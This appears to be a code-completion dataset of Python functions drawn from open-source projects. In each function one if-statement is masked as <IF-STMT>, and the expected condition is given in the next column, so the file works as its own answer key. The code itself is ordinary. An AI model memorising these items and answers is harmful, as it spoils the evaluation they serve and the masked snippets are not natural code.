759,"def sort_sizes(size_list):<tab>""""""Sorts sizes with extensions. Assumes that size is already in largest unit possible""""""<tab>final_list = []<tab>for suffix in ["" B"", "" KB"", "" MB"", "" GB"", "" TB""]:<tab><tab>sub_list = [<tab><tab><tab>float(size[: -len(suffix)])<tab><tab><tab>for size in size_list<tab><tab><tab>if size.endswith(suffix) and size[: -len(suffix)][-1].isnumeric()<tab><tab>]<tab><tab>sub_list.sort()<tab><tab>final_list += [(str(size) + suffix) for size in sub_list]<tab><tab># Skip additional loops<tab><tab><IF-STMT><tab><tab><tab>break<tab>return final_list",if len ( final_list ) == len ( size_list ) :,183
760,"def rename_var(block: paddle.device.framework.Block, old_name: str, new_name: str):<tab>"""""" """"""<tab>for op in block.ops:<tab><tab>for input_name in op.input_arg_names:<tab><tab><tab>if input_name == old_name:<tab><tab><tab><tab>op._rename_input(old_name, new_name)<tab><tab>for output_name in op.output_arg_names:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>op._rename_output(old_name, new_name)<tab>block._rename_var(old_name, new_name)",if output_name == old_name :,155
761,"def _GetParserChains(self, events):<tab>""""""Return a dict with a plugin count given a list of events.""""""<tab>parser_chains = {}<tab>for event in events:<tab><tab>parser_chain = getattr(event, ""parser"", None)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if parser_chain in parser_chains:<tab><tab><tab>parser_chains[parser_chain] += 1<tab><tab>else:<tab><tab><tab>parser_chains[parser_chain] = 1<tab>return parser_chains",if not parser_chain :,122
762,def context(self):<tab># Needed to avoid Translate Toolkit construct ID<tab># as context\04source<tab>if self.template is not None:<tab><tab><IF-STMT><tab><tab><tab>return self.template.id<tab><tab>if self.template.context:<tab><tab><tab>return self.template.context<tab><tab>return self.template.getid()<tab>return self.unescape_csv(self.mainunit.getcontext()),if self . template . id :,103
763,"def _validate_min_max_value(field_name, value, opt):<tab>if isinstance(value, (int, float)):<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Invalid value %s assigned "" ""to field %s.\n"" % (value, field_name)<tab><tab><tab>)<tab>elif isinstance(value, str):<tab><tab>if len(value) < opt[""minValue""] or len(value) > opt[""maxValue""]:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Invalid value %s assigned "" ""to field %s.\n"" % (value, field_name)<tab><tab><tab>)","if value < opt [ ""minValue"" ] or value > opt [ ""maxValue"" ] :",164
764,"def _incr_internal(key, instance=None, tags=None, amount=1):<tab>from sentry.app import tsdb<tab>if _should_sample():<tab><tab>amount = _sampled_value(amount)<tab><tab><IF-STMT><tab><tab><tab>full_key = ""{}.{}"".format(key, instance)<tab><tab>else:<tab><tab><tab>full_key = key<tab><tab>try:<tab><tab><tab>tsdb.incr(tsdb.models.internal, full_key, count=amount)<tab><tab>except Exception:<tab><tab><tab>logger = logging.getLogger(""sentry.errors"")<tab><tab><tab>logger.exception(""Unable to incr internal metric"")",if instance :,150
765,"def get(self, key, default=None, version=None):<tab>key = self.make_key(key, version=version)<tab>self.validate_key(key)<tab>fname = self._key_to_file(key)<tab>try:<tab><tab>with open(fname, ""rb"") as f:<tab><tab><tab>exp = pickle.load(f)<tab><tab><tab>now = time.time()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._delete(fname)<tab><tab><tab>else:<tab><tab><tab><tab>return pickle.load(f)<tab>except (IOError, OSError, EOFError, pickle.PickleError):<tab><tab>pass<tab>return default",if exp < now :,156
766,"def on_execution_scenario(self, cpath, scenario):<tab>if isinstance(scenario, dict):<tab><tab>self.check_scenario(cpath, scenario)<tab>elif isinstance(scenario, str):<tab><tab>scenario_name = scenario<tab><tab>scenario_path = Path(""scenarios"", scenario_name)<tab><tab>scenario = self.linter.get_config_value(scenario_path, raise_if_not_found=False)<tab><tab><IF-STMT><tab><tab><tab>self.report(<tab><tab><tab><tab>ConfigWarning.ERROR,<tab><tab><tab><tab>""undefined-scenario"",<tab><tab><tab><tab>cpath,<tab><tab><tab><tab>""scenario %r is used but isn't defined"" % scenario_name,<tab><tab><tab>)",if not scenario :,167
767,"def getSubmitKey(request, response):<tab>titleId = request.bits[2]<tab>titleKey = request.bits[3]<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return success(request, response, ""Key successfully added"")<tab><tab>else:<tab><tab><tab>return error(request, response, ""Key validation failed"")<tab>except LookupError as e:<tab><tab>error(request, response, str(e))<tab>except OSError as e:<tab><tab>error(request, response, str(e))<tab>except BaseException as e:<tab><tab>error(request, response, str(e))","if blockchain . blockchain . suggest ( titleId , titleKey ) :",151
768,"def test_downstream_trials(trial_associated_artifact, trial_obj, sagemaker_session):<tab># allow trial components to index, 30 seconds max<tab>for i in range(3):<tab><tab>time.sleep(10)<tab><tab>trials = trial_associated_artifact.downstream_trials(<tab><tab><tab>sagemaker_session=sagemaker_session<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>break<tab>assert len(trials) == 1<tab>assert trial_obj.trial_name in trials",if len ( trials ) > 0 :,125
769,"def get_subfield_asts(context, return_type, field_asts):<tab>subfield_asts = DefaultOrderedDict(list)<tab>visited_fragment_names = set()<tab>for field_ast in field_asts:<tab><tab>selection_set = field_ast.selection_set<tab><tab><IF-STMT><tab><tab><tab>subfield_asts = collect_fields(<tab><tab><tab><tab>context,<tab><tab><tab><tab>return_type,<tab><tab><tab><tab>selection_set,<tab><tab><tab><tab>subfield_asts,<tab><tab><tab><tab>visited_fragment_names,<tab><tab><tab>)<tab>return subfield_asts",if selection_set :,140
770,"def _handle_children(self, removed, added):<tab># Stop all the removed children.<tab>for obj in removed:<tab><tab>obj.stop()<tab># Process the new objects.<tab>for obj in added:<tab><tab>obj.set(scene=self.scene, parent=self)<tab><tab><IF-STMT><tab><tab><tab>obj.source = self<tab><tab>elif is_filter(obj):<tab><tab><tab>obj.inputs.append(self)<tab><tab>if self.running:<tab><tab><tab>try:<tab><tab><tab><tab>obj.start()<tab><tab><tab>except:<tab><tab><tab><tab>exception()","if isinstance ( obj , ModuleManager ) :",148
771,"def __kmp_search(S, W):<tab>m = 0<tab>i = 0<tab>T = __kmp_table(W)<tab>while m + i < len(S):<tab><tab><IF-STMT><tab><tab><tab>i += 1<tab><tab><tab>if i == len(W):<tab><tab><tab><tab>yield m<tab><tab><tab><tab>m += i - T[i]<tab><tab><tab><tab>i = max(T[i], 0)<tab><tab>else:<tab><tab><tab>m += i - T[i]<tab><tab><tab>i = max(T[i], 0)",if S [ m + i ] == W [ i ] :,144
772,"def connection(self, commit_on_success=False):<tab>with self._lock:<tab><tab><IF-STMT><tab><tab><tab>if self._pending_connection is None:<tab><tab><tab><tab>self._pending_connection = sqlite.connect(self.filename)<tab><tab><tab>con = self._pending_connection<tab><tab>else:<tab><tab><tab>con = sqlite.connect(self.filename)<tab><tab>try:<tab><tab><tab>if self.fast_save:<tab><tab><tab><tab>con.execute(""PRAGMA synchronous = 0;"")<tab><tab><tab>yield con<tab><tab><tab>if commit_on_success and self.can_commit:<tab><tab><tab><tab>con.commit()<tab><tab>finally:<tab><tab><tab>if not self._bulk_commit:<tab><tab><tab><tab>con.close()",if self . _bulk_commit :,182
773,"def passed(self):<tab>for test in self.lints[0]:<tab><tab>for template in self.lints[0][test][""results""]:<tab><tab><tab>results = self.lints[0][test][""results""][template]<tab><tab><tab>if results:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return False<tab>return True",if self . _is_error ( results ) or self . strict :,92
774,"def testCheckIPGenerator(self):<tab>for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000):<tab><tab>if i == 254:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.0.255"")<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(str(ip), ""127.0.1.0"")<tab><tab>elif i == 1000:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.3.233"")<tab><tab>elif i == 65534:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.255.255"")<tab><tab>elif i == 65535:<tab><tab><tab>self.assertEqual(str(ip), ""127.1.0.0"")",elif i == 255 :,181
775,"def _DecodeUnknownMessages(message, encoded_message, pair_type):<tab>""""""Process unknown fields in encoded_message of a message type.""""""<tab>field_type = pair_type.value.type<tab>new_values = []<tab>all_field_names = [x.name for x in message.all_fields()]<tab>for name, value_dict in encoded_message.iteritems():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>value = PyValueToMessage(field_type, value_dict)<tab><tab>new_pair = pair_type(key=name, value=value)<tab><tab>new_values.append(new_pair)<tab>return new_values",if name in all_field_names :,161
776,"def test_apply_noise_model():<tab>p = Program(RX(np.pi / 2, 0), RX(np.pi / 2, 1), CZ(0, 1), RX(np.pi / 2, 1))<tab>noise_model = _decoherence_noise_model(_get_program_gates(p))<tab>pnoisy = apply_noise_model(p, noise_model)<tab>for i in pnoisy:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>elif isinstance(i, Pragma):<tab><tab><tab>assert i.command in [""ADD-KRAUS"", ""READOUT-POVM""]<tab><tab>elif isinstance(i, Gate):<tab><tab><tab>assert i.name in NO_NOISE or not i.params","if isinstance ( i , DefGate ) :",187
777,"def i2h(self, pkt, x):<tab>if x is not None:<tab><tab>if x < 0:<tab><tab><tab>warning(""Fixed3_7: Internal value too negative: %d"" % x)<tab><tab><tab>x = 0<tab><tab><IF-STMT><tab><tab><tab>warning(""Fixed3_7: Internal value too positive: %d"" % x)<tab><tab><tab>x = 3600000000<tab><tab>x = (x - 1800000000) * 1e-7<tab>return x",elif x > 3600000000 :,116
778,def onClicked(event):<tab>shaderConfig = dict()<tab>for child in self.shaderDefBox.children:<tab><tab>defName = child.shaderDefine<tab><tab>enabled = child.isChecked()<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>mat.addShaderDefine(defName)<tab><tab><tab>else:<tab><tab><tab><tab>mat.removeShaderDefine(defName)<tab><tab>except:<tab><tab><tab>pass<tab># Reload material properties (update enabled states) and shader uniforms<tab>self.listUniforms(mat)<tab>self.listMaterialSettings(self.getSelectedObject()),if enabled :,147
779,"def is_mod(self, member: discord.Member) -> bool:<tab>""""""Checks if a member is a mod or admin of their guild.""""""<tab>try:<tab><tab>member_snowflakes = member._roles  # DEP-WARN<tab><tab>for snowflake in await self._config.guild(member.guild).admin_role():<tab><tab><tab><IF-STMT>  # DEP-WARN<tab><tab><tab><tab>return True<tab><tab>for snowflake in await self._config.guild(member.guild).mod_role():<tab><tab><tab>if member_snowflakes.has(snowflake):  # DEP-WARN<tab><tab><tab><tab>return True<tab>except AttributeError:  # someone passed a webhook to this<tab><tab>pass<tab>return False",if member_snowflakes . has ( snowflake ) :,186
780,"def _verify_treestore(itr, tree_values):<tab>i = 0<tab>while itr:<tab><tab>values = tree_values[i]<tab><tab>if treestore[itr][0] != values[0]:<tab><tab><tab>return False<tab><tab>if treestore.iter_children(itr):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>itr = treestore.iter_next(itr)<tab><tab>i += 1<tab>return True","if not _verify_treestore ( treestore . iter_children ( itr ) , values [ 1 ] ) :",132
781,"def _default_config(self):<tab>if sys.platform.startswith(""win""):<tab><tab>return {""name"": ""Command Prompt"", ""cmd"": ""cmd.exe"", ""env"": {}}<tab>else:<tab><tab><IF-STMT><tab><tab><tab>shell = os.environ[""SHELL""]<tab><tab><tab>if os.path.basename(shell) == ""tcsh"":<tab><tab><tab><tab>cmd = [shell, ""-l""]<tab><tab><tab>else:<tab><tab><tab><tab>cmd = [shell, ""-i"", ""-l""]<tab><tab>else:<tab><tab><tab>cmd = [""/bin/bash"", ""-i"", ""-l""]<tab><tab>return {""name"": ""Login Shell"", ""cmd"": cmd, ""env"": {}}","if ""SHELL"" in os . environ :",170
782,"def _messageHandled(self, resultList):<tab>failures = 0<tab>for (success, result) in resultList:<tab><tab><IF-STMT><tab><tab><tab>failures += 1<tab><tab><tab>log.err(result)<tab>if failures:<tab><tab>msg = ""Could not send e-mail""<tab><tab>resultLen = len(resultList)<tab><tab>if resultLen > 1:<tab><tab><tab>msg += "" ({} failures out of {} recipients)"".format(failures, resultLen)<tab><tab>self.sendCode(550, networkString(msg))<tab>else:<tab><tab>self.sendCode(250, b""Delivery in progress"")",if not success :,147
783,"def to_internal_value(self, data):<tab>site = get_current_site()<tab>pages_root = reverse(""pages-root"")<tab>ret = []<tab>for path in data:<tab><tab>if path.startswith(pages_root):<tab><tab><tab>path = path[len(pages_root) :]<tab><tab># strip any final slash<tab><tab><IF-STMT><tab><tab><tab>path = path[:-1]<tab><tab>page = get_page_from_path(site, path)<tab><tab>if page:<tab><tab><tab>ret.append(page)<tab>return ret","if path . endswith ( ""/"" ) :",136
784,"def _prune(self):<tab>with self.lock:<tab><tab>entries = self._list_dir()<tab><tab>if len(entries) > self._threshold:<tab><tab><tab>now = time.time()<tab><tab><tab>try:<tab><tab><tab><tab>for i, fpath in enumerate(entries):<tab><tab><tab><tab><tab>remove = False<tab><tab><tab><tab><tab>f = LockedFile(fpath, ""rb"")<tab><tab><tab><tab><tab>exp = pickle.load(f.file)<tab><tab><tab><tab><tab>f.close()<tab><tab><tab><tab><tab>remove = exp <= now or i % 3 == 0<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>self._del_file(fpath)<tab><tab><tab>except Exception:<tab><tab><tab><tab>pass",if remove :,173
785,"def get_ax_arg(uri):<tab>if not ax_ns:<tab><tab>return u""""<tab>prefix = ""openid."" + ax_ns + "".type.""<tab>ax_name = None<tab>for name in self.request.arguments.keys():<tab><tab><IF-STMT><tab><tab><tab>part = name[len(prefix) :]<tab><tab><tab>ax_name = ""openid."" + ax_ns + "".value."" + part<tab><tab><tab>break<tab>if not ax_name:<tab><tab>return u""""<tab>return self.get_argument(ax_name, u"""")",if self . get_argument ( name ) == uri and name . startswith ( prefix ) :,150
786,"def _generate_expression(self):<tab># turn my _format attribute into the _expression attribute<tab>e = []<tab>for part in PARSE_RE.split(self._format):<tab><tab>if not part:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>e.append(r""\{"")<tab><tab>elif part == ""}}"":<tab><tab><tab>e.append(r""\}"")<tab><tab>elif part[0] == ""{"" and part[-1] == ""}"":<tab><tab><tab># this will be a braces-delimited field to handle<tab><tab><tab>e.append(self._handle_field(part))<tab><tab>else:<tab><tab><tab># just some text to match<tab><tab><tab>e.append(REGEX_SAFETY.sub(self._regex_replace, part))<tab>return """".join(e)","elif part == ""{{"" :",189
787,"def get_clean_username(user):<tab>try:<tab><tab>username = force_text(user)<tab>except AttributeError:<tab><tab># AnonymousUser may not have USERNAME_FIELD<tab><tab>username = ""anonymous""<tab>else:<tab><tab># limit changed_by and created_by to avoid problems with Custom User Model<tab><tab><IF-STMT><tab><tab><tab>username = u""{0}... (id={1})"".format(<tab><tab><tab><tab>username[: PAGE_USERNAME_MAX_LENGTH - 15],<tab><tab><tab><tab>user.pk,<tab><tab><tab>)<tab>return username",if len ( username ) > PAGE_USERNAME_MAX_LENGTH :,144
788,"def process_request(self, request):<tab>for old, new in self.names_name:<tab><tab>request.uri = request.uri.replace(old, new)<tab><tab>if is_text_payload(request) and request.body:<tab><tab><tab>try:<tab><tab><tab><tab>body = (<tab><tab><tab><tab><tab>str(request.body, ""utf-8"")<tab><tab><tab><tab><tab>if isinstance(request.body, bytes)<tab><tab><tab><tab><tab>else str(request.body)<tab><tab><tab><tab>)<tab><tab><tab>except TypeError:  # python 2 doesn't allow decoding through str<tab><tab><tab><tab>body = str(request.body)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>request.body = body.replace(old, new)<tab>return request",if old in body :,182
789,"def get_config_variable(self, name, methods=(""env"", ""config""), default=None):<tab>value = None<tab>config_name, envvar_name = self.session_var_map[name]<tab>if methods is not None:<tab><tab>if ""env"" in methods and value is None:<tab><tab><tab>value = os.environ.get(envvar_name)<tab><tab><IF-STMT><tab><tab><tab>value = self.config_file_vars.get(config_name)<tab>else:<tab><tab>value = default<tab>return value","if ""config"" in methods and value is None :",134
790,"def get_field_by_name(obj, field):<tab># Dereference once<tab>if obj.type.code == gdb.TYPE_CODE_PTR:<tab><tab>obj = obj.dereference()<tab>for f in re.split(""(->|\.|\[\d+\])"", field):<tab><tab>if not f:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>obj = obj.dereference()<tab><tab>elif f == ""."":<tab><tab><tab>pass<tab><tab>elif f.startswith(""[""):<tab><tab><tab>n = int(f.strip(""[]""))<tab><tab><tab>obj = obj.cast(obj.dereference().type.pointer())<tab><tab><tab>obj += n<tab><tab><tab>obj = obj.dereference()<tab><tab>else:<tab><tab><tab>obj = obj[f]<tab>return obj","if f == ""->"" :",189
791,"def read_subpkgdata_dict(pkg, d):<tab>ret = {}<tab>subd = read_pkgdatafile(get_subpkgedata_fn(pkg, d))<tab>for var in subd:<tab><tab>newvar = var.replace(""_"" + pkg, """")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>ret[newvar] = subd[var]<tab>return ret","if newvar == var and var + ""_"" + pkg in subd :",104
792,"def _classify_volume(self, ctxt, volumes):<tab>bypass_volumes = []<tab>replica_volumes = []<tab>for v in volumes:<tab><tab>volume_type = self._get_volume_replicated_type(ctxt, v)<tab><tab>grp = v.group<tab><tab>if grp and utils.is_group_a_type(grp, ""consistent_group_replication_enabled""):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>replica_volumes.append(v)<tab><tab>else:<tab><tab><tab>bypass_volumes.append(v)<tab>return bypass_volumes, replica_volumes","elif volume_type and v . status in [ ""available"" , ""in-use"" ] :",159
793,"def _ensure_entity_values(self):<tab>entities_values = {<tab><tab>entity.name: self._get_entity_values(entity) for entity in self.entities<tab>}<tab>for intent in self.intents:<tab><tab>for utterance in intent.utterances:<tab><tab><tab>for chunk in utterance.slot_chunks:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>chunk.text = next(entities_values[chunk.entity])<tab><tab><tab><tab>except StopIteration:<tab><tab><tab><tab><tab>raise DatasetFormatError(<tab><tab><tab><tab><tab><tab>""At least one entity value must be provided for ""<tab><tab><tab><tab><tab><tab>""entity '%s'"" % chunk.entity<tab><tab><tab><tab><tab>)<tab>return self",if chunk . text is not None :,188
794,"def _consume_msg(self):<tab>async for data in self._stream:<tab><tab>stream = data.get(""ev"")<tab><tab>if stream:<tab><tab><tab>await self._dispatch(data)<tab><tab><IF-STMT><tab><tab><tab># Polygon returns this on an empty 'ev' id..<tab><tab><tab>data[""ev""] = ""status""<tab><tab><tab>await self._dispatch(data)<tab><tab><tab>raise ConnectionResetError(<tab><tab><tab><tab>""Polygon terminated connection: "" f'({data.get(""message"")})'<tab><tab><tab>)","elif data . get ( ""status"" ) == ""disconnected"" :",135
795,"def GetHeaderWidth(self):<tab>""""""Returns the header window width, in pixels.""""""<tab>if not self._headerWidth:<tab><tab>count = self.GetColumnCount()<tab><tab>for col in range(count):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>self._headerWidth += self.GetColumnWidth(col)<tab>if self.HasAGWFlag(ULC_FOOTER):<tab><tab>self._footerWidth = self._headerWidth<tab>return self._headerWidth",if not self . IsColumnShown ( col ) :,123
796,"def testCheckIPGenerator(self):<tab>for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000):<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(str(ip), ""127.0.0.255"")<tab><tab>elif i == 255:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.1.0"")<tab><tab>elif i == 1000:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.3.233"")<tab><tab>elif i == 65534:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.255.255"")<tab><tab>elif i == 65535:<tab><tab><tab>self.assertEqual(str(ip), ""127.1.0.0"")",if i == 254 :,181
797,"def childrenTodo(self, p=None):<tab>if p is None:<tab><tab>p = self.c.currentPosition()<tab>for p in p.children():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self.setat(p.v, ""priority"", 19)<tab><tab>self.loadIcons(p)","if self . getat ( p . v , ""priority"" ) != 9999 :",92
798,"def __init__(self, **kwargs):<tab>super(DepthwiseSeparableASPPModule, self).__init__(**kwargs)<tab>for i, dilation in enumerate(self.dilations):<tab><tab><IF-STMT><tab><tab><tab>self[i] = DepthwiseSeparableConvModule(<tab><tab><tab><tab>self.in_channels,<tab><tab><tab><tab>self.channels,<tab><tab><tab><tab>3,<tab><tab><tab><tab>dilation=dilation,<tab><tab><tab><tab>padding=dilation,<tab><tab><tab><tab>norm_cfg=self.norm_cfg,<tab><tab><tab><tab>act_cfg=self.act_cfg,<tab><tab><tab>)",if dilation > 1 :,146
799,"def test_char(self):<tab>for x in range(256):<tab><tab>c = System.Char.Parse(chr(x))<tab><tab>self.assertEqual(c, chr(x))<tab><tab>self.assertEqual(chr(x), c)<tab><tab>if c == chr(x):<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>self.assertTrue(False)<tab><tab><IF-STMT><tab><tab><tab>self.assertTrue(False)<tab><tab>if chr(x) == c:<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>self.assertTrue(False)<tab><tab>if not chr(x) == c:<tab><tab><tab>self.assertTrue(False)",if not c == chr ( x ) :,162
800,"def create_model_handler(ns, model_type):<tab>@route(f""/<provider>/{ns}/<model_id>"")<tab>@use_provider<tab>def handle(req, provider, model_id):<tab><tab># special cases:<tab><tab># fuo://<provider>/users/me -> show current logged user<tab><tab><IF-STMT><tab><tab><tab>if model_id == ""me"":<tab><tab><tab><tab>user = getattr(provider, ""_user"", None)<tab><tab><tab><tab>if user is None:<tab><tab><tab><tab><tab>raise CmdException(f""log in provider:{provider.identifier} first"")<tab><tab><tab><tab>return user<tab><tab>model = get_model_or_raise(provider, model_type, model_id)<tab><tab>return model",if model_type == ModelType . user :,184
801,"def __str__(self, prefix="""", printElemNumber=0):<tab>res = """"<tab>if self.has_key_:<tab><tab>res += prefix + (""key: %s\n"" % self.DebugFormatString(self.key_))<tab>cnt = 0<tab>for e in self.value_:<tab><tab>elm = """"<tab><tab><IF-STMT><tab><tab><tab>elm = ""(%d)"" % cnt<tab><tab>res += prefix + (""value%s: %s\n"" % (elm, self.DebugFormatString(e)))<tab><tab>cnt += 1<tab>if self.has_partial_:<tab><tab>res += prefix + (""partial: %s\n"" % self.DebugFormatBool(self.partial_))<tab>return res",if printElemNumber :,170
802,"def set_value_type_index(self, rows: list, value_type_index: int):<tab>for row in rows:<tab><tab>label = self.message_type[row]<tab><tab><IF-STMT><tab><tab><tab>label.value_type_index = value_type_index<tab><tab><tab>self.protocol_label_updated.emit(label)<tab>self.update()",if not label . is_checksum_label :,96
803,"def get_model_param(self, job_id, cpn_name, role, party_id):<tab>result = None<tab>party_id = str(party_id)<tab>try:<tab><tab>result = self.client.component.output_model(<tab><tab><tab>job_id=job_id, role=role, party_id=party_id, component_name=cpn_name<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>f""job {job_id}, component {cpn_name} has no output model param""<tab><tab><tab>)<tab><tab>return result[""data""]<tab>except:<tab><tab>raise ValueError(""Cannot get output model, err msg: "")","if ""data"" not in result :",173
804,"def validate(self) -> None:<tab>if self.query:<tab><tab>if not self.sysupgrade:<tab><tab><tab>for arg_name in (""aur"", ""repo""):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise MissingArgument(""sysupgrade"", arg_name)","if getattr ( self , arg_name ) :",74
805,"def print_nested_help(self, args: argparse.Namespace) -> None:<tab>level = 0<tab>parser = self.main_parser<tab>while True:<tab><tab>if parser._subparsers is None:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>choices = parser._subparsers._actions[-1].choices<tab><tab>value = getattr(args, ""level_%d"" % level)<tab><tab>if value is None:<tab><tab><tab>parser.print_help()<tab><tab><tab>return<tab><tab>if not choices:<tab><tab><tab>break<tab><tab>if isinstance(choices, dict):<tab><tab><tab>parser = choices[value]<tab><tab>else:<tab><tab><tab>return<tab><tab>level += 1",if parser . _subparsers . _actions is None :,175
806,"def merge(self, abort=False, message=None):<tab>""""""Merge remote branch or reverts the merge.""""""<tab>if abort:<tab><tab>self.execute([""update"", ""--clean"", "".""])<tab>elif self.needs_merge():<tab><tab>if self.needs_ff():<tab><tab><tab>self.execute([""update"", ""--clean"", ""remote(.)""])<tab><tab>else:<tab><tab><tab>self.configure_merge()<tab><tab><tab># Fallback to merge<tab><tab><tab>try:<tab><tab><tab><tab>self.execute([""merge"", ""-r"", ""remote(.)""])<tab><tab><tab>except RepositoryException as error:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab># Nothing to merge<tab><tab><tab><tab><tab>return<tab><tab><tab><tab>raise<tab><tab><tab>self.execute([""commit"", ""--message"", ""Merge""])",if error . retcode == 255 :,191
807,"def parseArtistIds(cls, page):<tab>ids = list()<tab>js = demjson.decode(page)<tab>if ""error"" in js and js[""error""]:<tab><tab>raise PixivException(""Error when requesting Fanbox"", 9999, page)<tab>if ""body"" in js and js[""body""] is not None:<tab><tab>js_body = js[""body""]<tab><tab><IF-STMT><tab><tab><tab>js_body = js_body[""supportingPlans""]<tab><tab>for creator in js_body:<tab><tab><tab>ids.append(creator[""user""][""userId""])<tab>return ids","if ""supportingPlans"" in js [ ""body"" ] :",148
808,"def ignore(self, other):<tab>if isinstance(other, Suppress):<tab><tab>if other not in self.ignoreExprs:<tab><tab><tab>super().ignore(other)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.expr.ignore(self.ignoreExprs[-1])<tab>else:<tab><tab>super().ignore(other)<tab><tab>if self.expr is not None:<tab><tab><tab>self.expr.ignore(self.ignoreExprs[-1])<tab>return self",if self . expr is not None :,117
809,"def execute(self):<tab>func = self.func<tab>is_batch_func = getattr(func, ""_task_batch"", False)<tab>g[""current_task_is_batch""] = is_batch_func<tab>g[""current_tasks""] = [self]<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return func([{""args"": self.args, ""kwargs"": self.kwargs}])<tab><tab>else:<tab><tab><tab>return func(*self.args, **self.kwargs)<tab>finally:<tab><tab>g[""current_task_is_batch""] = None<tab><tab>g[""current_tasks""] = None",if is_batch_func :,148
810,"def fn(value=None):<tab>for i in [-1, 0, 1, 2, 3, 4]:<tab><tab>if i < 0:<tab><tab><tab>continue<tab><tab>elif i == 0:<tab><tab><tab>yield 0<tab><tab><IF-STMT><tab><tab><tab>yield 1<tab><tab><tab>i = 0<tab><tab><tab>yield value<tab><tab><tab>yield 2<tab><tab>else:<tab><tab><tab>try:<tab><tab><tab><tab>v = i / value<tab><tab><tab>except:<tab><tab><tab><tab>v = i<tab><tab><tab>yield v",elif i == 1 :,127
811,"def get_instrumentation_key(url):<tab>data = url.split(""//"")[1]<tab>try:<tab><tab>uuid.UUID(data)<tab>except ValueError:<tab><tab>values = data.split(""/"")<tab><tab><IF-STMT><tab><tab><tab>AppInsightsHelper.log.warning(""Bad format: '%s'"" % url)<tab><tab>return AppInsightsHelper._get_instrumentation_key(values[0], values[1])<tab>return data",if len ( values ) != 2 :,114
812,"def get_correct(ngrams_ref, ngrams_test, correct, total):<tab>for rank in ngrams_test:<tab><tab>for chain in ngrams_test[rank]:<tab><tab><tab>total[rank] += ngrams_test[rank][chain]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>correct[rank] += min(ngrams_test[rank][chain], ngrams_ref[rank][chain])<tab>return correct, total",if chain in ngrams_ref [ rank ] :,103
813,"def _content_type_params__set(self, value_dict):<tab>if not value_dict:<tab><tab>del self.content_type_params<tab><tab>return<tab>params = []<tab>for k, v in sorted(value_dict.items()):<tab><tab><IF-STMT><tab><tab><tab>v = '""%s""' % v.replace('""', '\\""')<tab><tab>params.append(""; %s=%s"" % (k, v))<tab>ct = self.headers.pop(""Content-Type"", """").split("";"", 1)[0]<tab>ct += """".join(params)<tab>self.headers[""Content-Type""] = ct",if not _OK_PARAM_RE . search ( v ) :,152
814,"def split_file(self, filename, block_size=2 ** 20):<tab>with open(filename, ""rb"") as f:<tab><tab>file_list = []<tab><tab>while True:<tab><tab><tab>data = f.read(block_size)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>filehash = os.path.join(self.resource_dir, self.__count_hash(data))<tab><tab><tab>filehash = os.path.normpath(filehash)<tab><tab><tab>with open(filehash, ""wb"") as fwb:<tab><tab><tab><tab>fwb.write(data)<tab><tab><tab>file_list.append(filehash)<tab>return file_list",if not data :,164
815,"def _set_live(self, live, _):<tab>if live is not None and not self.live:<tab><tab>if isinstance(live, basestring):<tab><tab><tab>live = [live]<tab><tab># Default is to use Memory analysis.<tab><tab>if len(live) == 0:<tab><tab><tab>mode = ""Memory""<tab><tab><IF-STMT><tab><tab><tab>mode = live[0]<tab><tab>else:<tab><tab><tab>raise RuntimeError(""--live parameter should specify only one mode."")<tab><tab>live_plugin = self.session.plugins.live(mode=mode)<tab><tab>live_plugin.live()<tab><tab># When the session is destroyed, close the live plugin.<tab><tab>self.session.register_flush_hook(self, live_plugin.close)<tab>return live",elif len ( live ) == 1 :,184
816,"def process_percent(token, state, command_line):<tab>if not state.is_range_start_line_parsed:<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""bad range: {0}"".format(state.scanner.state.source))<tab><tab>command_line.line_range.start.append(token)<tab>else:<tab><tab>if command_line.line_range.end:<tab><tab><tab>raise ValueError(""bad range: {0}"".format(state.scanner.state.source))<tab><tab>command_line.line_range.end.append(token)<tab>return parse_line_ref, command_line",if command_line . line_range . start :,154
